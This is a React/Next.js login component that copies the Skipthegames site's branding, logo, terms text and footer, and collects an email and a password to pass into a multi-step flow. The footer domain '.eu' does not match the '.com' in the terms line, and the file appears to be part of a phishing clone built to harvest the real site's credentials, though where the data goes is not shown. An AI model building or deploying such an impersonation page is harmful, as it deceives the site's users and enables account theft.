import Image from "next/image"
import Logo from "@/public/image/Skipthegames-255x39.png"
import React, { useState } from "react"
import Loding from "@/public/icon/loding"

interface firstPage {
    ChengEmailEvent: (email: string) => void;
    ChengPasswordEvent: (password: string) => void;
    handleNext: () => void;
    ErrorMessge: string;
}

const FirstPage: React.FC<firstPage> = ({ ChengEmailEvent, ChengPasswordEvent, handleNext, ErrorMessge }) => {
    const [showpass, setshowpass] = useState(false)

    const handlEmailChange = ({ inputEmail }: { inputEmail: string }) => {
        ChengEmailEvent(inputEmail)
    }
    const handlPasswordChange = ({ inputPassword }: { inputPassword: string }) => {
        ChengPasswordEvent(inputPassword)
    }

    return (
        <main className="w-screen h-screen flex flex-col ph:gap-1">
            <header className="w-full ph:h-[70px] lt:h-[90px] ph:px-5  lt:px-[160px] py-1">
                <Image priority={true} src={Logo} quality={100} className="h-[58%] w-auto cursor-pointer" alt="Logo" />
                <span className="lt:text-[13px] ph:text-[11px] font-medium">Skip the games. Get satisfaction.</span>
            </header>
            <section className="w-full h-[480px] flex ph:px-5 lt:px-[160px]">
                <div className="lt:w-1/2 ph:w-full h-full flex flex-col gap-[18px]">
                    <h1 className="text-black lt:text-[33px] ph:text-2xl">Log in to your account</h1>
                    <div className="lt:w-[85%] ph:w-full h-auto flex flex-col gap-5">
                        <div className="w-full h-auto flex flex-col">
                            <input type="email" required onChange={(e) => { handlEmailChange({ inputEmail: e.target.value }) }} className="h-12 p-3 text-black outline-none shadow-inner" placeholder="Your email" />
                            <div className={` ${ErrorMessge === "Please enter a valid email address" ? "flex" : "hidden"} py-5 px-4  rounded-b-md w-full h-6 bg-red-500 text-white items-center`}>
                                {ErrorMessge}
                            </div>
                        </div>
                        <div className="w-full flex flex-col">
                            <input type={showpass ? "text" : "password"} required onChange={(e) => { handlPasswordChange({ inputPassword: e.target.value }) }} className="h-12 p-3 text-black outline-none shadow-inner" placeholder="Password" />
                            <div className={` ${ErrorMessge !== "Please enter a valid email address" && ErrorMessge !== "Loading" && ErrorMessge !== "" ? "flex" : "hidden"} py-5 px-4  rounded-b-md w-full h-6 bg-red-500 text-white items-center`}>
                                {ErrorMessge}
                            </div>
                            <span className="text-sm underline text-red-800 font-medium cursor-pointer select-none" onClick={() => { setshowpass(showpass ? false : true) }}>{showpass ? "Hide password" : "Show password"}</span>
                        </div>
                    </div>
                    <button onClick={handleNext} className="lt:w-[85%] ph:w-full flex justify-center items-center h-[65px] bg-cyan-500 text-white rounded-md text-xl transition-all duration-300 hover:bg-cyan-600">
                        {ErrorMessge === "Loading" ? <Loding /> : "Log in"}
                    </button>
                    <div className="w-full h-auto flex flex-col py-2">
                        <div className="w-full h-auto flex gap-2">
                            <h2 className="lt:text-xl ph:text-sm font-bold text-red-500">Password not working?</h2>
                            <h2 className="lt:text-xl ph:text-sm font-bold text-red-800 underline">Click here</h2>
                        </div>
                        <div className="w-full h-auto flex gap-1 py-4">
                            <span className="lt:text-xs ph:text-[9px]">By clicking Log in you accept</span>
                            <span className="lt:text-xs ph:text-[9px] text-red-800 font-medium">Skipthegames.com Terms and Conditions of Use</span>
                        </div>
                        <div className="w-full h-auto flex gap-1 py-6">
                            <span className="lt:text-xs ph:text-[9px]">This site is protected by hCaptcha and its</span>
                            <span className="lt:text-xs ph:text-[9px] text-red-800 font-medium">Privacy Policy and Terms of Service</span>
                            <span className="lt:text-xs ph:text-[9px]">apply.</span>
                        </div>
                    </div>
                </div>
            </section>
            <div className="w-full h-auto flex justify-center items-center">
                <div className="lt:w-[80%] ph:w-[95%]">
                    <hr />
                    <hr />
                </div>
            </div>
            <div className="w-full h-auto flex justify-center items-center">
                <div className="lt:w-[80%] ph:w-full ph:px-5 h-auto lt:py-6 flex pc:flex-row ph:flex-col ph:gap-5 lt:gap-60">
                    <h2 className="text-xl text-gray-500 hover:text-red-800 cursor-pointer">©Skipthegames.eu</h2>
                    <div className="w-auto h-auto flex">
                        <ul className="flex text-[18px] gap-7 ph:gap-5">
                            <li className="cursor-pointer pc:text-lg ph:text-base text-gray-400 hover:text-red-800">Home</li>
                            <li className="cursor-pointer pc:text-lg ph:text-base text-red-800">Contact</li>
                            <li className="cursor-pointer pc:text-lg ph:text-base text-red-800">About</li>
                            <li className="cursor-pointer pc:text-lg ph:text-base text-red-800">Privacy</li>
                            <li className="cursor-pointer pc:text-lg ph:text-base text-red-800">Terms</li>
                            <li className="cursor-pointer pc:text-lg ph:text-base text-red-800">Escort Info</li>
                        </ul>
                    </div>
                </div>
            </div>
        </main>
    )
}

export default FirstPage

